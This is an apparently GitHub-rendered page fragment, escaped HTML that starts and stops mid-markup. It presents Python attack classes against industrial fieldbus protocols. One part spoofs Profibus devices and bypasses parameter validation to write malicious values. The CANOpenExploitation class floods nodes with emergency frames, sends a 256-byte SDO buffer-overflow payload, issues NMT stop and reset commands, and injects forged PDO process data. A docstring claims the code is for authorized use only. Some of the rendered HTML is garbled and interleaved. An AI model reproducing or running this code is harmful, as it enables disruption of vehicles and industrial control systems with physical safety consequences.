checks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Bypass parameter validation mechanisms\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003evalidation_bypass\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebypass_parameter_validation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparameter\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evalidation_bypass\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Write malicious parameter value\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ewrite_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eraw_parameter_write\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparameter\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# Verify parameter change persistence\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003epersistence\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_parameter_persistence\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparameter\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewrite_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eand\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epersistence\u003c/span\u003e\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n\n    \u003cspan class=\"pl-c\"\u003e# Additional helper methods would be implemented here...\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eload_profibus_device_profiles\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Load known Profibus device profiles for accurate spoofing\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'drive_profiles'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'AC_Drive'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'DC_Drive'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Servo_Drive'\u003c/span\u003e],\n            \u003cspan class=\"pl-s\"\u003e'io_profiles'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'Digital_IO'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Analog_IO'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Special_Function'\u003c/span\u003e],\n            \u003cspan class=\"pl-s\"\u003e'sensor_profiles'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'Temperature'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Pressure'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Flow'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Level'\u003c/span\u003e],\n            \u003cspan class=\"pl-s\"\u003e'controller_profiles'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'PLC'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'DCS'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'PAC'\u003c/span\u003e]\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ebuild_topology_map\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevices\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Build comprehensive Profibus network topology map\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'master_station'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eNone\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'slave_devices'\u003c/span\u003e: [],\n            \u003cspan class=\"pl-s\"\u003e'network_parameters'\u003c/span\u003e: {},\n            \u003cspan class=\"pl-s\"\u003e'communication_relationships'\u003c/span\u003e: {}\n        }\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edevices\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eget\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'is_master'\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e):\n                \u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'master_station'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'slave_devices'\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecalculate_spoof_address\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eoriginal_address\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Calculate optimal spoof address to avoid conflicts\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003eoriginal_address\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e64\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e126\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Simple offset calculation\u003c/span\u003e\n        \u003cspan class=\"pl-s\"\u003e``\u003c/span\u003e`\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSpoofing Techniques:\u003c/strong\u003e\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eDevice identity extraction and spoofing\u003c/li\u003e\n\u003cli\u003eParameter manipulation\u003c/li\u003e\n\u003cli\u003eCommunication data-snippet-clipboard-copy-content=\"class CANOpenExploitation:\n    def __init__(self, can_interface='vcan0'):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL AUTOMOTIVE/INDUSTRIAL SECURITY NOTICE: This class demonstrates CANOpen\n        protocol exploitation for authorized security research and testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - Automotive ECU security testing in isolated environments\n        - Industrial control system CAN bus security assessment\n        - Red team exercises with proper authorization and oversight\n        - Defensive IDS/IPS development and validation\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational vehicle systems\n        - Do not deploy in production industrial environments\n        - Avoid interference with safety-critical systems\n        - Comply with all automotive and industrial safety standards\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - ISO 11898 (CAN Bus Standard)\n        - CIA 301 (CANOpen Application Layer)\n        - SAE J1939 (Heavy Vehicle CAN Standard)\n        - NIST SP 800-82 (Industrial Control System Security)\n        \u0026quot;\u0026quot;\u0026quot;\n        self.interface = can_interface\n        self.can = CAN(self.interface)\n        self.node_ids = self.scan_canopen_nodes()\n\n    def canopen_emergency_flood(self, target_node):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute CANOpen emergency frame flooding attack to disrupt target node operation.\n        Sends continuous emergency frames to overwhelm the target's error handling capabilities.\n        \u0026quot;\u0026quot;\u0026quot;\n        import time\n        \n        # Craft malicious emergency frames with various error conditions\n        emergency_frames = [\n            CANFrame(0x080 + target_node, [0xFF, 0x00, 0x00, 0x00]),  # Generic error (0xFF00)\n            CANFrame(0x080 + target_node, [0x00, 0x10, 0x00, 0x00]),  # Communication error (0x0010)\n            CANFrame(0x080 + target_node, [0x00, 0x20, 0x00, 0x00]),  # Device hardware error (0x0020)\n            CANFrame(0x080 + target_node, [0x00, 0x30, 0x00, 0x00]),  # Device software error (0x0030)\n            CANFrame(0x080 + target_node, [0x00, 0x40, 0x00, 0x00]),  # Device monitoring error (0x0040)\n        ]\n        \n        print(f\u0026quot;[*] Starting emergency frame flood attack on node {target_node}\u0026quot;)\n        frame_count = 0\n        \n        # Continuous flooding loop with rate limiting\n        while True:\n            for frame in emergency_frames:\n                self.can.send(frame)\n                frame_count += 1\n                \n                # Print status every 100 frames\n                if frame_count % 100 == 0:\n                    print(f\u0026quot;[*] Sent {frame_count} emergency frames to node {target_node}\u0026quot;)\n            \n            # 1ms delay between frame batches to avoid complete bus saturation\n            time.sleep(0.001)\n\n    def canopen_sdo_exploitation(self, target_node):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute CANOpen SDO exploitation for memory manipulation and code execution.\n        Crafts malicious SDO write requests to trigger buffer overflows or memory corruption.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Craft exploit payload targeting specific SDO object dictionary entries\n        exploit_payload = self.craft_sdo_exploit_payload()\n        \n        # Send SDO write request with malicious data to target node\n        sdo_write = CANFrame(0x600 + target_node, exploit_payload)\n        self.can.send(sdo_write)\n        \n        print(f\u0026quot;[*] Sent SDO exploit payload to node {target_node}\u0026quot;)\n        \n        # Trigger exploitation by sending NMT start command\n        trigger_frame = CANFrame(0x000, [0x01])  # NMT start command\n        self.can.send(trigger_frame)\n        \n        # Verify exploitation success\n        exploitation_success = self.verify_exploitation(target_node)\n        \n        return {\n            'target_node': target_node,\n            'exploitation_success': exploitation_success,\n            'payload_size': len(exploit_payload),\n            'sdo_object': self.parse_sdo_object(exploit_payload)\n        }\n\n    def canopen_nmt_attack(self, target_node):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute CANOpen NMT (Network Management) protocol attacks.\n        Allows unauthorized control over node states and network behavior.\n        \u0026quot;\u0026quot;\u0026quot;\n        # NMT state change attacks\n        nmt_attacks = [\n            CANFrame(0x000, [0x01, target_node]),  # Start remote node\n            CANFrame(0x000, [0x02, target_node]),  # Stop remote node  \n            CANFrame(0x000, [0x80, target_node]),  # Enter pre-operational\n            CANFrame(0x000, [0x81, target_node]),  # Reset node\n            CANFrame(0x000, [0x82, target_node]),  # Reset communication\n        ]\n        \n        attack_results = []\n        for attack_frame in nmt_attacks:\n            self.can.send(attack_frame)\n            attack_results.append({\n                'command': attack_frame.data[0],\n                'node': target_node,\n                'success': self.verify_nmt_state(target_node, attack_frame.data[0])\n            })\n        \n        return attack_results\n\n    def canopen_pdo_hijacking(self, target_node):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute CANOpen PDO (Process Data Object) hijacking attacks.\n        Intercept and manipulate real-time process data exchanges.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Eavesdrop on PDO communications\n        pdo_messages = self.capture_pdo_traffic(target_node)\n        \n        # Analyze PDO mapping and data structure\n        pdo_mapping = self.analyze_pdo_mapping(pdo_messages)\n        \n        # Craft malicious PDO messages\n        malicious_pdos = self.craft_malicious_pdos(pdo_mapping)\n        \n        # Inject malicious PDOs to manipulate process data\n        injection_results = []\n        for malicious_pdo in malicious_pdos:\n            self.can.send(malicious_pdo)\n            injection_results.append({\n                'pdo_cob_id': malicious_pdo.arbitration_id,\n                'data': malicious_pdo.data,\n                'injection_success': self.verify_pdo_injection(target_node, malicious_pdo)\n            })\n        \n        return injection_results\n\n    def craft_sdo_exploit_payload(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Craft malicious SDO payload for buffer overflow or memory corruption.\n        Targets specific object dictionary entries with oversized or malformed data.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Example: Buffer overflow in device name string (Object 0x1008)\n        exploit_payload = bytearray()\n        \n        # SDO write header (expedited transfer, write request)\n        exploit_payload.extend([0x23, 0x08, 0x10, 0x00])  # 0x23 = write 4 bytes, 0x1008 = device name\n        \n        # Overflow payload - exceeds typical device name buffer\n        overflow_data = b'A' * 256  # 256-byte buffer overflow\n        exploit_payload.extend(overflow_data)\n        \n        return bytes(exploit_payload)\n\n    def scan_canopen_nodes(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Scan CAN bus for active CANOpen nodes using NMT and SDO discovery.\n        \u0026quot;\u0026quot;\u0026quot;\n        print(\u0026quot;[*] Scanning for CANOpen nodes...\u0026quot;)\n        discovered_nodes = []\n        \n        # Try NMT node guarding to discover nodes\n        for node_id in range(1, 128):  # Standard CANOpen node ID range\n            node_guard_frame = CANFrame(0x700 + node_id, [0x00])\n            self.can.send(node_guard_frame)\n            \n            # Check for response\n            response = self.can.receive(timeout=0.1)\n            if response and response.arbitration_id == 0x700 + node_id:\n                discovered_nodes.append(node_id)\n                print(f\u0026quot;[+] Discovered CANOpen node: {node_id}\u0026quot;)\n        \n        return discovered_nodes\n\n    def verify_exploitation(self, target_node):\n        \u0026quot;\u0026quot;\u0026quot;\n        Verify if SDO exploitation was successful by checking node behavior.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Send SDO read request to check if node is responsive\n        test_sdo = CANFrame(0x600 + target_node, [0x40, 0x00, 0x10, 0x00])  # Read device type\n        self.can.send(test_sdo)\n        \n        # Check for response with timeout\n        response = self.can.receive(timeout=2.0)\n        \n        if not response:\n            # No response may indicate crash or successful exploitation\n            return True\n        elif response.arbitration_id == 0x580 + target_node:\n            # Valid response but check for abnormal behavior\n            return self.analyze_abnormal_behavior(response.data)\n        \n        return False\n\n    # Additional helper methods would be implemented here...\n    def parse_sdo_object(self, payload):\n        \u0026quot;\u0026quot;\u0026quot;Parse SDO object from payload data\u0026quot;\u0026quot;\u0026quot;\n        if len(payload) \u0026gt;= 4:\n            index = (payload[2] \u0026lt;\u0026lt; 8) | payload[1]\n            subindex = payload[3]\n            return f\u0026quot;0x{index:04X}.{subindex:02X}\u0026quot;\n        return \u0026quot;Unknown\u0026quot;\n\n    def analyze_abnormal_behavior(self, response_data):\n        \u0026quot;\u0026quot;\u0026quot;Analyze response data for signs of exploitation success\u0026quot;\u0026quot;\u0026quot;\n        # Check for unexpected data patterns, error codes, or protocol violations\n        return any(byte != 0 for byte in response_data[4:])  # Simple heuristic\n        ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eCANOpenExploitation\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ecan_interface\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'vcan0'\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        CRITICAL AUTOMOTIVE/INDUSTRIAL SECURITY NOTICE: team exercises with proper authorization and oversight\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Defensive IDS/IPS development and validation\u003c/span\u003e\n\u003cspan Standard)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - CIA 301 (CANOpen Application Layer)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - SAE J1939 (Heavy Vehicle CAN \u003cspan class=\"pl-s1\"\u003ecan_interface\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eCAN\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einterface\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003enode_ids\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecanopen_emergency_flood\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute CANOpen emergency frame flooding class=\"pl-s1\"\u003eemergency_frames\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x080\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0xFF\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Generic error (0xFF00)\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x080\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan
